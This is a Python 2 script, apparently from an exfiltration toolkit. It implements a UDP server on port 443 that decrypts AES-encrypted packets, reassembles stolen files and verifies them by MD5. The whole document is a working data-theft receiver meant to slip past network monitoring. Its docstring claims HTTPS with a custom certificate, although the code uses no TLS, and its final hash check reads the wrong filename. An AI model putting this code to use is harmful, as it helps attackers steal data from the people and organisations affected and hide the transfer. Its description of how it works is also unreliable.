#!/usr/bin/python

"""
Using HTTPS with a custom certificate to exfiltrate data.
This is interesting because other than the handshake that can be monitored,
the actual information transfered is gibberish and there is no way of knowing
whether the data is encrypted with that certificate or not, unless you have
the original private key (which you dont!)
"""

import os
import sys
import struct
import base64
import socket
import random
import hashlib

from thread import *
from Crypto import Random
from Crypto.Cipher import AES


def md5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


class AESCipher(object):
    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        # enc = base64.b64decode(enc)
        iv = enc[: AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size :])).decode("utf-8")

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[: -ord(s[len(s) - 1 :])]


class HTTPSExfiltrationServer:
    def __init__(self, key, host="0.0.0.0", port=443, max_connections=5, max_size=8192):
        self.max_connections = max_connections
        self.max_size = max_size
        self.port = port
        self.host = host

        self.AESDriver = AESCipher(key=key)

        # Initiate connection
        self._create_socket()

        # Vars for Use:
        self.all_files = []

    def _create_socket(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.bind((self.host, self.port))
        except socket.error, e:
            sys.stderr.write(
                "[-]\tSocket error trying to listen to %s:%s.\n"
                % (self.host, self.port)
            )
            sys.stderr.write(str(e) + "\n")
            sys.exit(1)
        sys.stdout.write(
            "[+]\tEstablished a listening on %s:[udp]%s.\n" % (self.host, self.port)
        )
        return 0

    def _decode_cid(self, cid):
        try:
            a = struct.unpack("<LL", cid)
            a = (a[1] << 32) + a[0]
        except:
            return 1
        return a

    def startlistening(self):
        sys.stdout.write("[+]\tStarted listening.\n")
        try:
            while True:
                data, address = self.sock.recvfrom(4096)
                sys.stdout.write(
                    "[.]\tReceived %s bytes from %s:%s.\n"
                    % (len(data), address[0], address[1])
                )

                if data:
                    # Open packet:
                    useless = data[:1]  # First byte
                    seq = self._decode_cid(data[1 : 8 + 1])  # Sequence
                    counter = ord(data[9:10])  # Counter
                    enc_data = data[10:]  # Actual data

                    # Check if first packet:
                    if len(enc_data) % 16 == 0:
                        dec_data = self.AESDriver.decrypt(enc_data)  # Decrypt
                        if counter == 0:
                            try:
                                filename, md5sum, count = dec_data.split(";")
                                sys.stdout.write(
                                    "[+]\tGetting file '%s' with MD5 '%s' in %s packets.\n"
                                    % (filename, md5sum, count)
                                )
                                self.filename = filename.replace("/", "_")
                                self.current_file = ""
                                self.md5 = md5sum
                                self.seq = seq
                                self.count = count
                            except ValueError:
                                sys.stderr.write(
                                    "[-]\tError understanding decrypted data.\n"
                                )
                                continue
                        else:
                            self.current_file += dec_data
                            if int(counter) == int(self.count):
                                sys.stdout.write(
                                    "[.]\tThis is the final packet in the file.\n"
                                )
                                f = open(self.filename, "wb")
                                f.write(self.current_file)
                                f.close()

                                if md5(filename) == self.md5:
                                    sys.stdout.write(
                                        "[+]\tCompleted file transfer '%s' with MD5 match.\n"
                                        % self.filename.replace("_", "/")
                                    )
                                    self.filename = None
                                    self.current_file = None
                                    self.md5 = None
                                    self.seq = None
                                    self.count = None

                    else:
                        sys.stderr.write("[!]\tFile length does not split to 16.\n")

        except KeyboardInterrupt:
            sys.stdout.write("[.]\tGot keyboard interrupt. Exiting.\n")
            sys.exit(0)


if __name__ == "__main__":
    server = HTTPSExfiltrationServer(host="127.0.0.1", key="123")
    server.startlistening()
